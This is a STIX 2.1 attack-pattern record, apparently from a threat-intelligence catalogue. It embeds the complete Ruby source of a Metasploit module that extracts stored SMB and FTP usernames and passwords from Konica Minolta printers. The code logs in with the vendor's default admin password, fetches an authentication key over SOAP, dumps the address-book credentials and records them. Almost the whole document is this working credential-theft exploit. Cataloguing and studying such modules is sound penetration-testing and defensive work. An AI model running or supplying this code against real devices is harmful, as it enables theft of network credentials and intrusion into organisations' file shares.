{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--0f0baf2a-bc2d-45fb-81ae-db07b72b0475",
    "created": "2024-08-14T16:32:07.62081Z",
    "modified": "2024-08-14T16:32:07.620815Z",
    "name": "Konica Minolta Password Extractor",
    "description": " This module will extract FTP and SMB account usernames and passwords from Konica Minolta multifunction printer (MFP) devices. Tested models include C224, C280, 283, C353, C360, 363, 420, C452, C452, C452, C454e, and C554. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/gather/konica_minolta_pwd_extract.rb",
            "external_id": "konica_minolta_pwd_extract.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Report\n  include Msf::Auxiliary::Scanner\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'        => 'Konica Minolta Password Extractor',\n      'Description' => %q{\n          This module will extract FTP and SMB account usernames and passwords\n          from Konica Minolta multifunction printer (MFP) devices. Tested models include\n          C224, C280, 283, C353, C360, 363, 420, C452, C452, C452, C454e, and C554.\n        },\n      'Author'      =>\n        [\n          'Deral \"Percentx\" Heiland',\n          'Pete \"Bokojan\" Arzamendi'\n        ],\n      'License'     => MSF_LICENSE\n    ))\n\n    register_options(\n      [\n        Opt::RPORT('50001'),\n        OptString.new('USER', [true, 'The default Admin user', 'Admin']),\n        OptString.new('PASSWD', [true, 'The default Admin password', '12345678']),\n        OptInt.new('TIMEOUT', [true, 'Timeout for printer probe', 20])\n\n      ])\n  end\n\n  # Creates the XML data to be sent that will extract AuthKey\n  def generate_authkey_request_xlm(major, minor)\n    user = datastore['USER']\n    passwd = datastore['PASSWD']\n    Nokogiri::XML::Builder.new do |xml|\n      xml.send('SOAP-ENV:Envelope',\n               'xmlns:SOAP-ENV' => 'http://schemas.xmlsoap.org/soap/envelope/',\n               'xmlns:SOAP-ENC' => 'http://schemas.xmlsoap.org/soap/encoding/',\n               'xmlns:xsi' => 'http://www.w3.org/2001/XMLSchema-instance',\n               'xmlns:xsd' => 'http://www.w3.org/2001/XMLSchema'){\n        xml.send('SOAP-ENV:Header'){\n          xml.send('me:AppReqHeader', 'xmlns:me' => \"http://www.konicaminolta.com/Header/OpenAPI-#{major}-#{minor}\"){\n            xml.send('ApplicationID', 'xmlns' => '') { xml.text '0' }\n            xml.send('UserName', 'xmlns' => '') { xml.text '' }\n            xml.send('Password', 'xmlns' => '') { xml.text '' }\n            xml.send('Version', 'xmlns' => ''){\n              xml.send('Major') { xml.text \"#{major}\" }\n              xml.send('Minor') { xml.text \"#{minor}\" }\n            }\n            xml.send('AppManagementID', 'xmlns' => '') { xml.text '0' }\n          }\n        }\n        xml.send('SOAP-ENV:Body') {\n          xml.send('AppReqLogin', 'xmlns' => \"http://www.konicaminolta.com/service/OpenAPI-#{major}-#{minor}\"){\n            xml.send('OperatorInfo'){\n              xml.send('UserType') { xml.text \"#{user}\" }\n              xml.send('Password') { xml.text \"#{passwd}\" }\n            }\n            xml.send('TimeOut') { xml.text '60' }\n          }\n        }\n      }\n    end\n  end\n\n  # Create XML data that will be sent to extract SMB and FTP passwords from device\n  def generate_pwd_request_xlm(major, minor, authkey)\n    Nokogiri::XML::Builder.new do |xml|\n      xml.send('SOAP-ENV:Envelope',\n               'xmlns:SOAP-ENV' => 'http://schemas.xmlsoap.org/soap/envelope/',\n               'xmlns:SOAP-ENC' => 'http://schemas.xmlsoap.org/soap/encoding/',\n               'xmlns:xsi' => 'http://www.w3.org/2001/XMLSchema-instance',\n               'xmlns:xsd' => 'http://www.w3.org/2001/XMLSchema'){\n        xml.send('SOAP-ENV:Header'){\n          xml.send('me:AppReqHeader', 'xmlns:me' => \"http://www.konicaminolta.com/Header/OpenAPI-#{major}-#{minor}\"){\n            xml.send('ApplicationID', 'xmlns' => '') { xml.text '0' }\n            xml.send('UserName', 'xmlns' => '') { xml.text '' }\n            xml.send('Password', 'xmlns' => '') { xml.text '' }\n            xml.send('Version', 'xmlns' => ''){\n              xml.send('Major') { xml.text \"#{major}\" }\n              xml.send('Minor') { xml.text \"#{minor}\" }\n            }\n            xml.send('AppManagementID', 'xmlns' => '') { xml.text '1000' }\n          }\n        }\n        xml.send('SOAP-ENV:Body'){\n          xml.send('AppReqGetAbbr', 'xmlns' => \"http://www.konicaminolta.com/service/OpenAPI-#{major}-#{minor}\"){\n            xml.send('OperatorInfo'){\n              xml.send('AuthKey') { xml.text \"#{authkey}\" }\n            }\n            xml.send('AbbrListCondition'){\n              xml.send('SearchKey') { xml.text 'None' }\n              xml.send('WellUse') {  xml.text 'false' }\n              xml.send('ObtainCondition'){\n                xml.send('Type') { xml.text 'OffsetList' }\n                xml.send('OffsetRange'){\n                  xml.send('Start') { xml.text '1' }\n                  xml.send('Length') { xml.text '100' }\n                }\n              }\n              xml.send('BackUp') { xml.text 'true' }\n              xml.send('BackUpPassword') { xml.text 'MYSKIMGS' }\n            }\n          }\n        }\n      }\n    end\n  end\n\n  # This next section will post the XML soap messages for information gathering.\n  def run_host(ip)\n    print_status(\"Attempting to extract username and password from the host at #{peer}\")\n    version\n  end\n\n  # Validate XML Major Minor version\n  def version\n    response = send_request_cgi(\n    {\n      'uri'    => '/',\n      'method' => 'POST',\n      'data'   => '<SOAP-ENV:Envelope></SOAP-ENV:Envelope>'\n    }, datastore['TIMEOUT'].to_i)\n    if response.nil?\n      print_error(\"No reponse from device\")\n      return\n    else\n      xml0_body = ::Nokogiri::XML(response.body)\n      major_parse = xml0_body.xpath('//Major').text\n      minor_parse = xml0_body.xpath('//Minor').text\n      major = (\"#{major_parse}\")\n      minor = (\"#{minor_parse}\")\n      login(major, minor)\n    end\n\n    rescue ::Rex::ConnectionError\n      print_error(\"Version check Connection failed\")\n  end\n\n  # This section logs on and retrieves AuthKey token\n  def login(major, minor)\n    authreq_xml = generate_authkey_request_xlm(major, minor)\n    # Send post request with crafted XML to login and retreive AuthKey\n    begin\n      response = send_request_cgi(\n      {\n        'uri'    => '/',\n        'method' => 'POST',\n        'data'   => authreq_xml.to_xml\n      }, datastore['TIMEOUT'].to_i)\n      if response.nil?\n        print_error(\"No reponse from device\")\n        return\n      else\n        xml1_body = ::Nokogiri::XML(response.body)\n        authkey_parse = xml1_body.xpath('//AuthKey').text\n        authkey = (\"#{authkey_parse}\")\n        extract(major, minor, authkey)\n      end\n    rescue ::Rex::ConnectionError\n      print_error(\"Login Connection failed\")\n    end\n  end\n\n  # This section post xml soap message that will extract usernames and passwords\n  def extract(major, minor, authkey)\n    if (authkey != '')\n      # create xml request to extract user credintial settings\n      smbreq_xml = generate_pwd_request_xlm(major, minor, authkey)\n      # Send post request with crafted XML as data\n      begin\n        response = send_request_cgi(\n        {\n          'uri'    => '/',\n          'method' => 'POST',\n          'data'   => smbreq_xml.to_xml\n        }, datastore['TIMEOUT'].to_i)\n        if response.nil?\n          print_error(\"No reponse from device\")\n          return\n        else\n          xml2_body = ::Nokogiri::XML(response.body)\n          @smb_user = xml2_body.xpath('//SmbMode/User').map { |val1| val1.text }\n          @smb_pass = xml2_body.xpath('//SmbMode/Password').map { |val2| val2.text }\n          @smb_host = xml2_body.xpath('//SmbMode/Host').map { |val3| val3.text }\n          @ftp_user = xml2_body.xpath('//FtpServerMode/User').map { |val4| val4.text }\n          @ftp_pass = xml2_body.xpath('//FtpServerMode/Password').map { |val5| val5.text }\n          @ftp_host = xml2_body.xpath('//FtpServerMode/Address').map { |val6| val6.text }\n          @ftp_port = xml2_body.xpath('//FtpServerMode/PortNo').map { |val6| val6.text }\n        end\n      end\n      i = 0\n      # output SMB data\n      @smb_user.each do\n        shost = \"#{@smb_host[i]}\"\n        sname = \"#{@smb_user[i]}\"\n        sword = \"#{@smb_pass[i]}\"\n        print_good(\"SMB Account:User=#{sname}:Password=#{sword}:Host=#{shost}:Port=139\")\n        register_creds('smb', shost, '139', sname, sword)\n        i += 1\n      end\n      i = 0\n      # output FTP data\n      @ftp_user.each do\n        fhost = \"#{@ftp_host[i]}\"\n        fname = \"#{@ftp_user[i]}\"\n        fword = \"#{@ftp_pass[i]}\"\n        fport = \"#{@ftp_port[i]}\"\n        print_good(\"FTP Account:User=#{fname}:Password=#{fword}:Host=#{fhost}:Port=#{fport}\")\n        register_creds('ftp', fhost, fport, fname, fword)\n        i += 1\n      end\n\n    else\n      print_error('No AuthKey returned possible causes Authentication failed or unsupported Konica model')\n      return\n    end\n  end\n\n  def register_creds(service_name, remote_host, remote_port, username, password)\n    credential_data = {\n      origin_type: :service,\n      module_fullname: self.fullname,\n      workspace_id: myworkspace_id,\n      private_data: password,\n      private_type: :password,\n      username: username\n    }\n\n    service_data = {\n      address: remote_host,\n      port: remote_port,\n      service_name: service_name,\n      protocol: 'tcp',\n      workspace_id: myworkspace_id\n    }\n\n    credential_data.merge!(service_data)\n    credential_core = create_credential(credential_data)\n\n    login_data = {\n      core: credential_core,\n      status: Metasploit::Model::Login::Status::UNTRIED,\n      workspace_id: myworkspace_id\n    }\n\n    login_data.merge!(service_data)\n    create_credential_login(login_data)\n  end\nend\n"
}